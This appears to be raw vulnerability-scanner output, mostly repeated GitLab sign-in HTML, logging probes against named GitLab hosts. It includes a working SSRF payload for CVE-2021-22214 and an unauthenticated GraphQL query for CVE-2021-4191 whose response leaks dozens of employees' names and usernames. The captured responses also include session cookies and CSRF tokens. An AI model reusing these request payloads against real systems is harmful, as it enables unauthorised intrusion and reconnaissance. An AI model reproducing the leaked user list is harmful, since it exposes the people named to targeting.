+<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
+  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
+  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
+  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
+  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
+  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
+  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
+  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
+</svg>
+
+</header>
+
+<div class="login-page-broadcast">
+
+
+</div>
+<div class="container navless-container">
+<div class="content">
+<div class="flash-container flash-container-page sticky">
+</div>
+
+<div class="row mt-3">
+<div class="col-sm-12">
+<h1 class="mb-3 font-weight-normal">
+GitLab Community Edition
+</h1>
+</div>
+</div>
+<div class="row mb-3">
+<div class="col-sm-7 order-12 order-sm-1 brand-holder">
+
+<h3 class="mt-sm-0">
+A complete DevOps platform
+</h3>
+<p>
+GitLab is a single application for the entire software development lifecycle. From project planning and source code management to CI/CD, monitoring, and security.
+</p>
+
+</div>
+<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
+<div id="signin-container">
+<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
+<li class="nav-item" role="presentation">
+<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
+</li>
+</ul>
+
+<div class="tab-content">
+<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
+<div class="login-body">
+<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="s6fctfLilrNaE8YaMNGExpDiIyKR5gxHqBKWKcfDHLf4ZMIshuGnSN0EcVDhbOnm62FyXqS2ihlT2hujZODG7g==" /><div class="form-group">
+<label for="user_login" class="label-bold">Username or email</label>
+<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
+</div>
+<div class="form-group">
+<label class="label-bold" for="user_password">Password</label>
+<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
+</div>
+<div class="remember-me">
+<label for="user_remember_me">
+<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
+<span>Remember me</span>
+</label>
+<div class="float-right">
+<a href="/users/password/new">Forgot your password?</a>
+</div>
+</div>
+<div></div>
+<div class="submit-container move-submit-down">
+<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
+</div>
+</form>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+<hr class="footer-fixed">
+<div class="container footer-container">
+<div class="footer-links">
+<a href="/explore">Explore</a>
+<a href="/help">Help</a>
+<a href="https://about.gitlab.com/">About GitLab</a>
+</div>
+</div>
+
+</div>
+</body>
+</html>
+
+============================================
+http://hzcnde.com/m/                     🤓 
+[vuln] [high] [CVE-2021-22214] https://sandadmin.yunqiandou.com/api/v4/ci/lint?include_merged_yaml=true
+================  请求数据包 ================
+POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1
+Host: sandadmin.yunqiandou.com
+User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 67
+Accept: */*
+Accept-Language: en
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"content": "include:\n  remote: http://127.0.0.1:9100/test.yml"}
+
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 113
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: application/json
+Date: Thu, 26 Mar 2026 06:17:33 GMT
+Etag: W/"b635f94e9dd628f1735099bfbf852052"
+Server: nginx
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Request-Id: YuNXTBlJ7x7
+X-Runtime: 0.093876
+
+{"status":"invalid","errors":["Included file `http://127.0.0.1:9100/test.yml` does not have valid YAML syntax!"]}
+============================================
+[vuln] [medium] [CVE-2021-4191] https://sandadmin.yunqiandou.com/api/graphql
+================  请求数据包 ================
+POST /api/graphql HTTP/1.1
+Host: sandadmin.yunqiandou.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Connection: close
+Content-Length: 917
+Accept: */*
+Content-Type: application/json
+Origin: https://sandadmin.yunqiandou.com
+Referer: https://sandadmin.yunqiandou.com/-/graphql-explorer
+Accept-Encoding: gzip
+
+{"query":"# Welcome to GraphiQL\n#\n# GraphiQL is an in-browser tool for writing, validating, and\n# testing GraphQL queries.\n#\n# Type queries into this side of the screen, and you will see intelligent\n# typeaheads aware of the current GraphQL type schema and live syntax and\n# validation errors highlighted within the text.\n#\n# GraphQL queries typically start with a \"{\" character. Lines that starts\n# with a # are ignored.\n#\n# An example GraphQL query might look like:\n#\n#     {\n#       field(arg: \"value\") {\n#         subField\n#       }\n#     }\n#\n# Keyboard shortcuts:\n#\n#  Prettify Query:  Shift-Ctrl-P (or press the prettify button above)\n#\n#       Run Query:  Ctrl-Enter (or press the play button above)\n#\n#   Auto Complete:  Ctrl-Space (or just start typing)\n#\n\n{\n  users {\n    nodes {\n      id\n      name\n      username\n    }\n  }\n}","variables":null,"operationName":null}
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Methods: GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS
+Access-Control-Allow-Origin: *
+Access-Control-Expose-Headers: Link, X-Total, X-Total-Pages, X-Per-Page, X-Page, X-Next-Page, X-Prev-Page, X-Gitlab-Blob-Id, X-Gitlab-Commit-Id, X-Gitlab-Content-Sha256, X-Gitlab-Encoding, X-Gitlab-File-Name, X-Gitlab-File-Path, X-Gitlab-Last-Commit-Id, X-Gitlab-Ref, X-Gitlab-Size
+Access-Control-Max-Age: 7200
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: application/json; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:33 GMT
+Etag: W/"ad332e571214fbf41c3f91b90d7adc9c"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: CPMm8QSo1t1
+X-Runtime: 0.067759
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+{"data":{"users":{"nodes":[{"id":"gid://gitlab/User/65","name":"GitLab Alert Bot","username":"alert-bot"},{"id":"gid://gitlab/User/64","name":"zhanglijuan","username":"zhanglijuan"},{"id":"gid://gitlab/User/62","name":"yangwanli","username":"yangwanli"},{"id":"gid://gitlab/User/61","name":"wuwenyu","username":"wuwenyu"},{"id":"gid://gitlab/User/60","name":"tongmiao","username":"tongmiao"},{"id":"gid://gitlab/User/59","name":"lwj","username":"lwj"},{"id":"gid://gitlab/User/58","name":"gzt","username":"gzt"},{"id":"gid://gitlab/User/57","name":"wanglinyang","username":"wanglinyang"},{"id":"gid://gitlab/User/56","name":"hanshuai","username":"hanshuai"},{"id":"gid://gitlab/User/55","name":"heyi","username":"heyi"},{"id":"gid://gitlab/User/54","name":"meijie","username":"meijie"},{"id":"gid://gitlab/User/53","name":"lixin","username":"lixin"},{"id":"gid://gitlab/User/52","name":"zbf","username":"zbf"},{"id":"gid://gitlab/User/51","name":"liangdongdong","username":"liangdongdong"},{"id":"gid://gitlab/User/50","name":"chenwenxing","username":"chenwenxing"},{"id":"gid://gitlab/User/45","name":"wufan","username":"spirit-wufan"},{"id":"gid://gitlab/User/41","name":"jzk","username":"jzk"},{"id":"gid://gitlab/User/40","name":"zhoutianhui","username":"zhoutianhui"},{"id":"gid://gitlab/User/36","name":"黄政阳","username":"hzy"},{"id":"gid://gitlab/User/34","name":"zhouquanbo","username":"zhouquanbo"},{"id":"gid://gitlab/User/33","name":"ls","username":"ls"},{"id":"gid://gitlab/User/31","name":"9GphYZYkxe","username":"9GphYZYkxe"},{"id":"gid://gitlab/User/30","name":"zhangwei","username":"zhangwei"},{"id":"gid://gitlab/User/29","name":"chenkang@aicaihr.com","username":"chenkang"},{"id":"gid://gitlab/User/27","name":"lijiaxin","username":"lijiaxin"},{"id":"gid://gitlab/User/26","name":"heajing","username":"heajing"},{"id":"gid://gitlab/User/25","name":"yuxinyu","username":"yuxinyu"},{"id":"gid://gitlab/User/24","name":"fxl","username":"fxl"},{"id":"gid://gitlab/User/19","name":"songfeihu","username":"songfeihu"},{"id":"gid://gitlab/User/16","name":"chenyifan","username":"chenyifan"},{"id":"gid://gitlab/User/14","name":"xiaqi","username":"xiaqi"},{"id":"gid://gitlab/User/13","name":"tianmaoshan","username":"tianmaoshan"},{"id":"gid://gitlab/User/9","name":"chenpengfei","username":"chenpengfei"},{"id":"gid://gitlab/User/5","name":"Ghost User","username":"ghost"},{"id":"gid://gitlab/User/3","name":"liuyuhong","username":"lyh"},{"id":"gid://gitlab/User/2","name":"maxuefeng","username":"maxuefeng"},{"id":"gid://gitlab/User/1","name":"Administrator","username":"root"}]}}}
+============================================
+[vuln] [critical] [CVE-2022-0735] https://sandadmin.yunqiandou.com/users/sign_in
+================  请求数据包 ================
+GET /users/sign_in HTTP/1.1
+Host: sandadmin.yunqiandou.com
+User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:33 GMT
+Etag: W/"99c223d722bbcb2a8df91b2e704844bf"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Set-Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltWTBNRGM1WVRrMUxUQXdOalV0TkdNM1pTMWlZemxsTFRVek16TmxOekJtT0dSalpDST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--f201bf146d10bda2c48f2de8bb3eb63abb12c8b8; path=/; expires=Mon, 26 Mar 2046 06:17:33 -0000; secure; HttpOnly; SameSite=None
+Set-Cookie: _gitlab_session=0d097b4cfbd38e1e514881e989190b93; path=/; expires=Thu, 26 Mar 2026 08:17:33 -0000; secure; HttpOnly; SameSite=None
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: 2G4OKwHbHx7
+X-Runtime: 0.077137
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+<!DOCTYPE html>
+<html class="devise-layout-html">
+<head prefix="og: http://ogp.me/ns#">
+<meta charset="utf-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta content="object" property="og:type">
+<meta content="GitLab" property="og:site_name">
+<meta content="Sign in" property="og:title">
+<meta content="GitLab Community Edition" property="og:description">
+<meta content="https://sandadmin.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
+<meta content="64" property="og:image:width">
+<meta content="64" property="og:image:height">
+<meta content="https://sandadmin.yunqiandou.com/users/sign_in" property="og:url">
+<meta content="summary" property="twitter:card">
+<meta content="Sign in" property="twitter:title">
+<meta content="GitLab Community Edition" property="twitter:description">
+<meta content="https://sandadmin.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">
+
+<title>Sign in · GitLab</title>
+<meta content="GitLab Community Edition" name="description">
+<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
+<link rel="stylesheet" media="all" href="/assets/application-4abc4e078df94075056919bd59aed6e7a0f95067039a8339b8f614924d8cb160.css" />
+<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />
+
+
+<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-aa541d93e094b4420ea8e2dcd8e2ee99bb24ef1010bbbd20d427b1f9c54d42da.css" />
+<script>
+//<![CDATA[
+window.gon={};
+//]]>
+</script>
+
+
+<script src="/assets/webpack/runtime.dd9905d6.bundle.js" defer="defer"></script>
+<script src="/assets/webpack/main.4ff6e187.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/commons~pages.admin.sessions~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.profiles.t~f07ce35f.a6d33088.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/pages.sessions.new.6586209e.chunk.js" defer="defer"></script>
+
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="GwUAhkcVdzGCwvT1nwtGZe7QvfQubPoYKBM75jYTIoihLxVrTR5AV73l6zZ+4vL7MWQUhkvz6gPEyyw3WYhwEA==" />
+
+<meta name="action-cable-url" content="/-/cable" />
+<meta content="origin-when-cross-origin" name="referrer">
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="#474D57" name="theme-color">
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
+<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
+<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
+<meta content="#30353E" name="msapplication-TileColor">
+
+
+
+
+</head>
+
+<body class="application gl-browser-chrome gl-platform-linux login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">
+
+<script>
+//<![CDATA[
+gl = window.gl || {};
+gl.client = {"isChrome":true,"isLinux":true};
+
+
+//]]>
+</script>
+<div class="page-wrap">
+<header class="navbar fixed-top navbar-empty">
+<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
+  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
+  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
+  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
+  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
+  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
+  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
+  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
+</svg>
+
+</header>
+
+<div class="login-page-broadcast">
+
+
+</div>
+<div class="container navless-container">
+<div class="content">
+<div class="flash-container flash-container-page sticky">
+</div>
+
+<div class="row mt-3">
+<div class="col-sm-12">
+<h1 class="mb-3 font-weight-normal">
+GitLab Community Edition
+</h1>
+</div>
+</div>
+<div class="row mb-3">
+<div class="col-sm-7 order-12 order-sm-1 brand-holder">
+
+<h3 class="mt-sm-0">
+A complete DevOps platform
+</h3>
+<p>
+GitLab is a single application for the entire software development lifecycle. From project planning and source code management to CI/CD, monitoring, and security.
+</p>
+
+</div>
+<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
+<div id="signin-container">
+<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
+<li class="nav-item" role="presentation">
+<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
+</li>
+</ul>
+
+<div class="tab-content">
+<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
+<div class="login-body">
+<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="kD/opazNBJSrHkm7rQBUL2LWXSrtqbmuXtCK9QquNJUqFf1IpsYz8pQ5VnhM6eCxvWL0WIg2qbWyCJ0kZTVmDQ==" /><div class="form-group">
+<label for="user_login" class="label-bold">Username or email</label>
+<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
+</div>
+<div class="form-group">
+<label class="label-bold" for="user_password">Password</label>
+<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
+</div>
+<div class="remember-me">
+<label for="user_remember_me">
+<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
+<span>Remember me</span>
+</label>
+<div class="float-right">
+<a href="/users/password/new">Forgot your password?</a>
+</div>
+</div>
+<div></div>
+<div class="submit-container move-submit-down">
+<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
+</div>
+</form>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+<hr class="footer-fixed">
+<div class="container footer-container">
+<div class="footer-links">
+<a href="/explore">Explore</a>
+<a href="/help">Help</a>
+<a href="https://about.gitlab.com/">About GitLab</a>
+</div>
+</div>
+
+</div>
+</body>
+</html>
+
+============================================
+[vuln] [critical] [CVE-2021-22205] https://sandadmin.yunqiandou.com/users/sign_in
+================  请求数据包 ================
+GET /users/sign_in HTTP/1.1
+Host: sandadmin.yunqiandou.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: max-age=0, private, must-revalidate
+Content-Type: text/html; charset=utf-8
+Date: Thu, 26 Mar 2026 06:17:33 GMT
+Etag: W/"5c1fa004bd45020219c6a6a193e28d06"
+Referrer-Policy: strict-origin-when-cross-origin
+Server: nginx
+Set-Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltSmtZVFl4WW1ZMExUZzVZekV0TkRjNE55MWhNRGd4TFRObU56ZGtPV1UxWkRReVppST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--1a9e5fb4e5a05c7d441605d804ca3fd7a3858ae4; path=/; expires=Mon, 26 Mar 2046 06:17:33 -0000; secure; HttpOnly; SameSite=None
+Set-Cookie: _gitlab_session=2c385ace3d1bd087c6dd0ca28effa27f; path=/; expires=Thu, 26 Mar 2026 08:17:33 -0000; secure; HttpOnly; SameSite=None
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: AYYc4ZU0L87
+X-Runtime: 0.052022
+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+
+<!DOCTYPE html>
+<html class="devise-layout-html">
+<head prefix="og: http://ogp.me/ns#">
+<meta charset="utf-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta content="object" property="og:type">
+<meta content="GitLab" property="og:site_name">
+<meta content="Sign in" property="og:title">
+<meta content="GitLab Community Edition" property="og:description">
+<meta content="https://sandadmin.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="og:image">
+<meta content="64" property="og:image:width">
+<meta content="64" property="og:image:height">
+<meta content="https://sandadmin.yunqiandou.com/users/sign_in" property="og:url">
+<meta content="summary" property="twitter:card">
+<meta content="Sign in" property="twitter:title">
+<meta content="GitLab Community Edition" property="twitter:description">
+<meta content="https://sandadmin.yunqiandou.com/assets/gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png" property="twitter:image">
+
+<title>Sign in · GitLab</title>
+<meta content="GitLab Community Edition" name="description">
+<link rel="shortcut icon" type="image/png" href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" id="favicon" data-original-href="/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png" />
+<link rel="stylesheet" media="all" href="/assets/application-4abc4e078df94075056919bd59aed6e7a0f95067039a8339b8f614924d8cb160.css" />
+<link rel="stylesheet" media="print" href="/assets/print-74c3df10dad473d66660c828e3aa54ca3bfeac6d8bb708643331403fe7211e60.css" />
+
+
+<link rel="stylesheet" media="all" href="/assets/highlight/themes/white-aa541d93e094b4420ea8e2dcd8e2ee99bb24ef1010bbbd20d427b1f9c54d42da.css" />
+<script>
+//<![CDATA[
+window.gon={};
+//]]>
+</script>
+
+
+<script src="/assets/webpack/runtime.dd9905d6.bundle.js" defer="defer"></script>
+<script src="/assets/webpack/main.4ff6e187.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/commons~pages.admin.sessions~pages.ldap.omniauth_callbacks~pages.omniauth_callbacks~pages.profiles.t~f07ce35f.a6d33088.chunk.js" defer="defer"></script>
+<script src="/assets/webpack/pages.sessions.new.6586209e.chunk.js" defer="defer"></script>
+
+<meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="m6LWQzrPAPcB/DD7pgn3YpNHL+DJTISteBQqjIUOfG6pCCU+vq4XODS9jQ1NYgyWs3ozwO6IDfIJc1aPPEc7YA==" />
+
+<meta name="action-cable-url" content="/-/cable" />
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="#474D57" name="theme-color">
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-5a9cee0e8a51212e70b90c87c12f382c428870c0ff67d1eb034d884b78d2dae7.png" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-a6eec6aeb9da138e507593b464fdac213047e49d3093fc30e90d9a995df83ba3.png" sizes="76x76" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-iphone-retina-72e2aadf86513a56e050e7f0f2355deaa19cc17ed97bbe5147847f2748e5a3e3.png" sizes="120x120" />
+<link rel="apple-touch-icon" type="image/x-icon" href="/assets/touch-icon-ipad-retina-8ebe416f5313483d9c1bc772b5bbe03ecad52a54eba443e5215a22caed2a16a2.png" sizes="152x152" />
+<link color="rgb(226, 67, 41)" href="/assets/logo-d36b5212042cebc89b96df4bf6ac24e43db316143e89926c0db839ff694d2de4.svg" rel="mask-icon">
+<meta content="/assets/msapplication-tile-1196ec67452f618d39cdd85e2e3a542f76574c071051ae7effbfde01710eb17d.png" name="msapplication-TileImage">
+<meta content="#30353E" name="msapplication-TileColor">
+
+
+
+
+</head>
+
+<body class="application gl-browser-safari gl-platform-mac login-page navless ui-indigo" data-page="sessions:new" data-qa-selector="login_page">
+
+<script>
+//<![CDATA[
+gl = window.gl || {};
+gl.client = {"isSafari":true,"isMac":true};
+
+
+//]]>
+</script>
+<div class="page-wrap">
+<header class="navbar fixed-top navbar-empty">
+<svg width="24" height="24" class="tanuki-logo" viewBox="0 0 36 36">
+  <path class="tanuki-shape tanuki-left-ear" fill="#e24329" d="M2 14l9.38 9v-9l-4-12.28c-.205-.632-1.176-.632-1.38 0z"/>
+  <path class="tanuki-shape tanuki-right-ear" fill="#e24329" d="M34 14l-9.38 9v-9l4-12.28c.205-.632 1.176-.632 1.38 0z"/>
+  <path class="tanuki-shape tanuki-nose" fill="#e24329" d="M18,34.38 3,14 33,14 Z"/>
+  <path class="tanuki-shape tanuki-left-eye" fill="#fc6d26" d="M18,34.38 11.38,14 2,14 6,25Z"/>
+  <path class="tanuki-shape tanuki-right-eye" fill="#fc6d26" d="M18,34.38 24.62,14 34,14 30,25Z"/>
+  <path class="tanuki-shape tanuki-left-cheek" fill="#fca326" d="M2 14L.1 20.16c-.18.565 0 1.2.5 1.56l17.42 12.66z"/>
+  <path class="tanuki-shape tanuki-right-cheek" fill="#fca326" d="M34 14l1.9 6.16c.18.565 0 1.2-.5 1.56L18 34.38z"/>
+</svg>
+
+</header>
+
+<div class="login-page-broadcast">
+
+
+</div>
+<div class="container navless-container">
+<div class="content">
+<div class="flash-container flash-container-page sticky">
+</div>
+
+<div class="row mt-3">
+<div class="col-sm-12">
+<h1 class="mb-3 font-weight-normal">
+GitLab Community Edition
+</h1>
+</div>
+</div>
+<div class="row mb-3">
+<div class="col-sm-7 order-12 order-sm-1 brand-holder">
+
+<h3 class="mt-sm-0">
+A complete DevOps platform
+</h3>
+<p>
+GitLab is a single application for the entire software development lifecycle. From project planning and source code management to CI/CD, monitoring, and security.
+</p>
+
+</div>
+<div class="col-sm-5 order-1 order-sm-12 new-session-forms-container">
+<div id="signin-container">
+<ul class="nav-links new-session-tabs nav-tabs nav" role="tablist">
+<li class="nav-item" role="presentation">
+<a class="nav-link active" data-qa-selector="sign_in_tab" data-toggle="tab" href="#login-pane" role="tab">Sign in</a>
+</li>
+</ul>
+
+<div class="tab-content">
+<div class="login-box tab-pane active" id="login-pane" role="tabpanel">
+<div class="login-body">
+<form class="new_user gl-show-field-errors" id="new_user" aria-live="assertive" action="/users/sign_in" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="a20uCm9cL078lDkgwWAnvrfARnX5ykN1aSDzb7q8sTdZx9136z04gcnVhNYqC9xKl/1aVd4OyioYR49sA/X2OQ==" /><div class="form-group">
+<label for="user_login" class="label-bold">Username or email</label>
+<input class="form-control top" autofocus="autofocus" autocapitalize="off" autocorrect="off" required="required" title="This field is required." data-qa-selector="login_field" type="text" name="user[login]" id="user_login" />
+</div>
+<div class="form-group">
+<label class="label-bold" for="user_password">Password</label>
+<input class="form-control bottom" required="required" title="This field is required." data-qa-selector="password_field" type="password" name="user[password]" id="user_password" />
+</div>
+<div class="remember-me">
+<label for="user_remember_me">
+<input name="user[remember_me]" type="hidden" value="0" /><input class="remember-me-checkbox" type="checkbox" value="1" name="user[remember_me]" id="user_remember_me" />
+<span>Remember me</span>
+</label>
+<div class="float-right">
+<a href="/users/password/new">Forgot your password?</a>
+</div>
+</div>
+<div></div>
+<div class="submit-container move-submit-down">
+<input type="submit" name="commit" value="Sign in" class="btn btn-success" data-qa-selector="sign_in_button" data-disable-with="Sign in" />
+</div>
+</form>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+<hr class="footer-fixed">
+<div class="container footer-container">
+<div class="footer-links">
+<a href="/explore">Explore</a>
+<a href="/help">Help</a>
+<a href="https://about.gitlab.com/">About GitLab</a>
+</div>
+</div>
+
+</div>
+</body>
+</html>
+
+============================================
+[vuln] [high] [CVE-2021-22214] https://sand.yunqiandou.com/api/v4/ci/lint?include_merged_yaml=true
+================  请求数据包 ================
+POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1
+Host: sand.yunqiandou.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
+Content-Length: 65
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"content": "include:\n  remote: http://127.0.0.1:9100/test.yml"}
+================  请求响应包 ================
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 113
